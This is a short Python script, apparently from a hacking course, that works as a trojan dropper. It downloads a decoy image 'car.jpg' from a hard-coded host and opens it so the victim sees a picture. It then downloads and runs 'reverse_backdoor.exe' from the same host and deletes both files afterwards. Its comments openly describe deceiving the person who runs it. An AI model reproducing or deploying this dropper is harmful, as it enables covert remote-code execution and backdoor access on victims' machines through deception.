#!/usr/bin/env python

import requests
import subprocess
import os
import tempfile

# packaging
# -m pip uninstall requests
# -m pip install requests==2.5.1

def download(url):
    # GET request --> response
    get_response = requests.get(url)

    # splited by /, last element is the filename
    filename = url.split("/")[-1]

    with open(filename, mode="wb") as out_file:
        # open a binary file to write
        out_file.write(get_response.content)
    print("[+] Download sucessfully.")

        
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

host_ip = "192.168.140.130"
url = "http://" + host_ip + "/Projects/car.jpg"
download(url)
# cannot use subprocess.call here because it will get stuck
# people see the image while the code continue to execute
subprocess.Popen("car.jpg", shell=True)

url = "http://" + host_ip + "/Projects/reverse_backdoor.exe"
download(url)
# the program will pause until the backdoor is closed
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")